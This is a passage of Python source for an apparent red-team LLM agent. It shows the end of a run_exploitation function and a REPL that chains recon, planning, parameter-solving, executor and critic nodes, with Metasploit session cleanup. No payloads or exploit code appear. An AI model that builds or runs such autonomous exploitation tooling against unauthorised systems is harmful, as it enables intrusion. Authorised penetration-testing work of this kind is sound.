                    elif content.startswith("[Critic]"):
                        color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                        print_colored(f"\n{content}", color)
                    else:
                        print_colored(f"\nAgent: {content}", Colors.OKGREEN)

    # Extract final state and return structured findings
    final_state_snapshot = app.get_state(config)
    final_state = final_state_snapshot.values

    findings = _extract_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_exploitation] Complete — success={findings['success']}", Colors.OKGREEN if findings['success'] else Colors.FAIL)
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# MAIN
# =============================================================================

def main():
    """Run the interactive agent REPL."""

    # Handle --graph flag for visualization
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            # Fallback: print node and edge info
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    print_colored(f"--- Red Team Multi-Node Agent ({MODEL_NAME}) ---", Colors.OKGREEN)
    print_colored("Nodes: recon_parser → researcher → planner → param_solver → executor → critic", Colors.OKCYAN)

    config = {
        "configurable": {"thread_id": "session_multinode_1"},
        "recursion_limit": 150
    }

    try:
        while True:
            user_input = input("\n[User]: ")
            if user_input.lower() in ["quit", "exit"]:
                break

            # Parse input type: "recon: <nmap output>" vs plain attack objective
            if user_input.lower().startswith("recon:"):
                raw_recon = user_input[6:].strip()
                msg_content = raw_recon
            else:
                raw_recon = ""
                msg_content = user_input

            initial_state = {
                "messages": [HumanMessage(content=msg_content)],
                "raw_recon": raw_recon,
                "current_plan": "",
                "tool_candidate": {},
                "execution_result": "",
                "loop_step": 0,
            }
            # Only reset target_info when providing new recon data;
            # on plain objectives, the checkpointer preserves target_info
            # from the prior recon run on the same thread.
            if raw_recon:
                initial_state["target_info"] = {}

            for event in app.stream(initial_state, config=config):
                for key, value in event.items():
                    if not value or "messages" not in value:
                        continue

                    messages = value["messages"]
                    if not isinstance(messages, list):
                        messages = [messages]

                    for msg in messages:
                        if not isinstance(msg, BaseMessage) or not msg.content:
                            continue

                        # Skip internal feedback messages in console output
                        if "CRITIC FEEDBACK" in msg.content:
                            print_colored(f"\n{msg.content}", Colors.FAIL)
                            continue
                        if "COMPRESSED HISTORY" in msg.content:
                            print_colored("\n[System] Context compressed for fresh retry.", Colors.OKCYAN)
                            continue

                        # Print based on message type and node
                        if isinstance(msg, ToolMessage):
                            # Truncate long tool output for console
                            display = msg.content[:500]
                            if len(msg.content) > 500:
                                display += "... [truncated]"
                            print(f"\n[Tool Output]: {display}")
                        elif isinstance(msg, AIMessage):
                            # Color-code by node
                            content = msg.content
                            if content.startswith("[Recon Parser]"):
                                print_colored(f"\n{content}", Colors.HEADER)
                            elif content.startswith("[Planner]"):
                                print_colored(f"\n{content}", Colors.OKBLUE)
                            elif content.startswith("[Parameter Solver]"):
                                print_colored(f"\n{content}", Colors.WARNING)
                            elif content.startswith("[Critic]"):
                                if "PASS" in content:
                                    print_colored(f"\n{content}", Colors.OKGREEN)
                                else:
                                    print_colored(f"\n{content}", Colors.FAIL)
                            else:
                                print_colored(f"\nAgent: {content}", Colors.OKGREEN)

                        # Show tool calls being made
                        if hasattr(msg, "tool_calls") and msg.tool_calls:
                            for t in msg.tool_calls:
                                print_colored(
                                    f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                                    Colors.OKCYAN
                                )

    except KeyboardInterrupt:
        print_colored("\nProgram interrupted by user", Colors.FAIL)
    finally:
        msf_session.cleanup()


if __name__ == "__main__":
    main()
